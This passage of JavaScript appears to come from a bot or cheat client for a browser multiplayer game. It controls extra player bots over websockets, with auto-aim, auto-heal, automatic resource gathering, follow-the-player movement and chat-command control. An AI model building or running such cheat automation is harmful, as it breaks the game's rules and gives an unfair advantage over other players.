                    doNewSend(["5", [15, 1]]);
                    doNewSend(["5", [ws.secondary, 1]]);
                    setTimeout(() => {
                        ws.autoaim = false;
                        ws.autoAttackWithAim3 = false;
                        doNewSend(["5", [ws.primary, 1]]);
                        if (!empToggle) {
                            doNewSend(["13c", [1, 6, 0]]);
                            doNewSend(["13c", [0, myBotOldHat, 0]]);
                        }
                        if (empToggle) {
                            doNewSend(["13c", [1, 22, 0]]);
                            doNewSend(["13c", [0, 22, 0]]);
                        }
                        doNewSend(['c', [0]]);
                    }, 300);
                }, 100);
            }
        }
        if ((ws.playerFollower || playerFollowerGlobal) && !ffs && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
            if (Math.sqrt(Math.pow((bot.y - pointingOnPosition.y), 2) + Math.pow((bot.x - pointingOnPosition.x), 2)) < 145) {
                if (!ws.typeMovement) {
                    ws.typeMovement = true;
                    if (pointer) {
                        doNewSend(['33', [typeMovement]]);
                        if (hatToggle) {
                            if (!ws.isEnemyNear && !ws.autoaim) {
                                doNewSend(['13c', [1, myPlayer.accessory, 1]]);
                                doNewSend(['13c', [0, 0, 1]]);
                                doNewSend(['13c', [0, myPlayer.accessory, 1]]);
                                doNewSend(['13c', [1, myPlayer.hat, 0]]);
                                doNewSend(['13c', [0, myPlayer.hat, 0]]);
                            }
                        }
                    } else {
                        doNewSend(['33', [null]]);
                    }
                }
            } else {
                if (document.move !== Math.atan2(pointingOnPosition.y - bot.y, pointingOnPosition.x - bot.x)) {
                    document.move = Math.atan2(pointingOnPosition.y - bot.y, pointingOnPosition.x - bot.x);
                    if (!ws.eoooding) {
                        ws.eoooding = true;
                        setTimeout(() => {ws.eoooding = false}, 100)
                        doNewSend(['33', [document.move]]);
                    }
                }
                if (ws.typeMovement) {
                    ws.typeMovement = false;
                    if (hatToggle) {
                        if (!ws.isEnemyNear && !ws.autoaim) {
                            doNewSend(['13c', [1, 11, 1]]);
                            doNewSend(['13c', [0, 0, 1]]);
                            doNewSend(['13c', [0, 11, 1]]);
                            if (bot.y < 2400){
                                doNewSend(['13c', [1, 15, 0]]);
                                doNewSend(['13c', [0, 15, 0]]);
                            } else if (bot.y > 6850 && bot.y < 7550){
                                doNewSend(['13c', [1, 31, 0]]);
                                doNewSend(['13c', [0, 31, 0]]);
                            } else {
                                doNewSend(['13c', [1, 12, 0]]);
                                doNewSend(['13c', [0, 12, 0]]);
                            }
                        }
                    }
                }
            }
        }
        if (ws.wooding && !ffs) {
            if (!(bot.wood >= ws.woodAmt)) {
                if (!ws.autoaim) {
                    if (!ws.woooding) {
                        ws.woooding = true;
                        setTimeout(() => {ws.woooding = false}, 100)
                        doNewSend(['c', [1, ws.nearestTreeAngle]]);
                    }
                    doNewSend(['33', [ws.nearestTreeAngle]]);
                }
            } else ws.wooding = false; doNewSend(['c', [0]]);
        }
        if (ws.fooding && !ffs) {
            if (!(bot.food >= ws.foodAmt)) {
                if (!ws.autoaim) {
                    if (!ws.foooding) {
                        ws.foooding = true;
                        setTimeout(() => {ws.foooding = false}, 100)
                        doNewSend(['c', [1, ws.nearestFoodAngle]]);
                    }
                    doNewSend(['33', [ws.nearestFoodAngle]]);
                }
            } else ws.fooding = false; doNewSend(['c', [0]]);
        }
        if (ws.stoning && !ffs) {
            if (!(bot.stone >= ws.stoneAmt)) {
                if (!ws.autoaim) {
                    if (!ws.soooding) {
                        ws.soooding = true;
                        setTimeout(() => {ws.soooding = false}, 100)
                        doNewSend(['c', [1, ws.nearestStoneAngle]]);
                    }
                    doNewSend(['33', [ws.nearestStoneAngle]]);
                }
            } else ws.stoning = false; doNewSend(['c', [0]]);
        }
        if (ws.mining && !ffs) {
            if (!(bot.points >= ws.goldAmt)) {
                if (!ws.autoaim) {
                    if (!ws.moooding) {
                        ws.moooding = true;
                        setTimeout(() => {ws.moooding = false}, 100)
                        doNewSend(['c', [1, ws.nearestMineAngle]]);
                    }
                    doNewSend(['33', [ws.nearestMineAngle]]);
                }
            } else ws.mining = false; doNewSend(['c', [0]]);
        }
        if (ffs) {
            if (ffsps !== Math.atan2((myPlayer.y - bot.y) + mouseY - (height / 2), (myPlayer.x- bot.x) + mouseX - (width / 2))) {
                ffsps = Math.atan2((myPlayer.y - bot.y) + mouseY - (height / 2), (myPlayer.x- bot.x) + mouseX - (width / 2));
                if (!ws.voooding) {
                    ws.voooding = true;
                    setTimeout(() => {ws.voooding = false}, 100)
                    if (!ws.autoaim) {
                        doNewSend(['2', [ffsps]]);
                    }
                    doNewSend(['33', [ffsps]]);
                }
            }
        }
        if (aimOnMouse && !ffs && ws.controlled && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
            if (ffsps !== Math.atan2((myPlayer.y - bot.y) + mouseY - (height / 2), (myPlayer.x- bot.x) + mouseX - (width / 2))) {
                ffsps = Math.atan2((myPlayer.y - bot.y) + mouseY - (height / 2), (myPlayer.x- bot.x) + mouseX - (width / 2));
                if (!ws.autoaim) {
                    doNewSend(['2', [ffsps]]);
                }
            }
        }
        if (item == "17") {
            if (data[2]) {
                ws.weapons = data[1];
                ws.primary = data[1][0];
                ws.secondary = data[1][1] || null;
            } else {
                ws.mats = data[1];
                for (let i = 0; i < data[1].length; i++) {
                    for (let i2 = 0; i2 < 3; i2++) {
                        if (i2 == data[1][i]) {
                            ws.foodType = data[1][i];
                        }
                    }
                    for (let i2 = 3; i2 < 6; i2++) {
                        if (i2 == data[1][i]) {
                            ws.wallType = data[1][i];
                        }
                    }
                    for (let i2 = 6; i2 < 10; i2++) {
                        if (i2 == data[1][i]) {
                            ws.spikeType = data[1][i];
                        }
                    }
                    for (let i2 = 10; i2 < 13; i2++) {
                        if (i2 == data[1][i]) {
                            ws.millType = data[1][i];
                        }
                    }
                    for (let i2 = 13; i2 < 15; i2++) {
                        if (i2 == data[1][i]) {
                            ws.mineType = data[1][i];
                        }
                    }
                    for (let i2 = 15; i2 < 17; i2++) {
                        if (i2 == data[1][i]) {
                            ws.boostType = data[1][i];
                        }
                    }
                    for (let i2 = 17; i2 < 23; i2++) {
                        if (i2 == data[1][i] && i2 !== 20) {
                            ws.turretType = data[1][i];
                        }
                        if (i2 == data[1][i] && i2 == 20) {
                            ws.spawnpadType = data[1][i];
                        }
                    }
                }
            }
        }
        if (item == "16") {
            for (let i2 in sockets) {
                for (let i = 0; i < fnc.length; i++) {
                    ws.oldSend(new Uint8Array(Array.from(msgpack5.encode(['6', [fnc[i]]]))));
                }
            }
        }
        if (item == "ch") {
            let ch = data;
            if (ch[2].toLocaleLowerCase() == '!f' && ch[1] == myPlayer.id) {
                ws.playerFollower = true;
                doNewSend(['33', []]);
            }
            if (ch[2].toLocaleLowerCase() == '!!f' && ch[1] == myPlayer.id) {
                ws.playerFollower = false;
                doNewSend(['33', []]);
            }
            if (data[2].toLocaleLowerCase() == '!close' && data[1] == myPlayer.id) {
                ws.close();
            }
            if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!wood' && data[1] == myPlayer.id) {
                ws.wooding = true;
                ws.stoning = false;
                ws.fooding = false;
                ws.mining = false;
                if (Math.round((data[2].toLocaleLowerCase()).split(' ')[1])) {
                    ws.woodAmt = Math.round((data[2].toLocaleLowerCase()).split(' ')[1]);
                } else {
                    ws.woodAmt = Infinity;
                }
                doNewSend(['c', [0]]);
            }
            if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!stone' && data[1] == myPlayer.id) {
                ws.wooding = false;
                ws.stoning = true;
                ws.fooding = false;
                ws.mining = false;
                if (Math.round((data[2].toLocaleLowerCase()).split(' ')[1])) {
                    ws.stoneAmt = Math.round((data[2].toLocaleLowerCase()).split(' ')[1]);
                } else {
                    ws.stoneAmt = Infinity;
                }
                doNewSend(['c', [0]]);
            }
            if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!gold' && data[1] == myPlayer.id) {
                ws.wooding = false;
                ws.stoning = false;
                ws.fooding = false;
                ws.mining = true;
                if (Math.round((data[2].toLocaleLowerCase()).split(' ')[1])) {
                    ws.goldAmt = Math.round((data[2].toLocaleLowerCase()).split(' ')[1]);
                } else {
                    ws.goldAmt = Infinity;
                }
                doNewSend(['c', [0]]);
            }
            if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!food' && data[1] == myPlayer.id) {
                ws.wooding = false;
                ws.stoning = false;
                ws.fooding = true;
                ws.mining = false;
                if (Math.round((data[2].toLocaleLowerCase()).split(' ')[1])) {
                    ws.foodAmt = Math.round((data[2].toLocaleLowerCase()).split(' ')[1]);
                } else {
                    ws.foodAmt = Infinity;
                }
                doNewSend(['c', [0]]);
            }
            if (data[2].toLocaleLowerCase() == '~wood' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.wood}`]]);
            }
            if (data[2].toLocaleLowerCase() == '~stone' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.stone}`]]);
            }
            if (data[2].toLocaleLowerCase() == '~gold' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.points}`]]);
            }
            if (data[2].toLocaleLowerCase() == '~gps' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.goldPerSecond}`]]);
            }
            if (data[2].toLocaleLowerCase() == '~food' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.food}`]]);
            }
            if (data[2].toLocaleLowerCase() == '~kills' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.kills}`]]);
            }
            if (data[2].toLocaleLowerCase() == '~id' && data[1] == myPlayer.id) {
                doNewSend(['ch', [`${bot.id}`]]);
            }
            if (data[2].toLocaleLowerCase() == "!cnt " + bot.id && data[1] == myPlayer.id) {
                ws.controlled = true;
            }
            if (data[2].toLocaleLowerCase() == "!cnt" && data[1] == myPlayer.id) {
                ws.controlled = true;
            }
            if (data[2].toLocaleLowerCase() == "!!cnt" && data[1] == myPlayer.id) {
                ws.controlled = false;
            }
            if (data[2].toLocaleLowerCase() == "!!cnt " + bot.id && data[1] == myPlayer.id) {
                ws.controlled = false;
            }
            if ((ch[2].toLocaleLowerCase()).split(' ')[0] == '!join' && ch[1] == myPlayer.id) {
                for (let i = 1; i < ch[2].split(' ').length; i++) {
                    doNewSend(['10', [ch[2].split(' ')[i]]]);
                }
            }
            if ((ch[2].toLocaleLowerCase()).split(' ')[0] == '!leave' && ch[1] == myPlayer.id) {
                doNewSend(['9', [null]]);
            }
        }
        if (item == "ac") {
            if (data[1].owner == myPlayer.id) {
                setTimeout(() => {
                    doNewSend(['10', [data[1].sid]]);
                }, 100);
            }
        }
        if(data[0] == "h" && data[1] == bot.id) {
            if(data[2] < 100 && data[2] > 0) {
                if (healToggle) {
                    setTimeout(() => {
                        for (let i = 0; i < 4; i++) {
                            doNewSend(['5', [ws.foodType, null]]);
                            doNewSend(['c', [1]]);
                            doNewSend(['c', [0]]);
                            doNewSend(['5', [null]]);
                        }
                    }, 80);
                }
            }
        }
    }
    ws.onmessage = (e) => {
        msgFnc(e);
    }
    ws.onclose = (e) => {
        delete sockets[bot.id];
        ws.closed = true;
    }
}
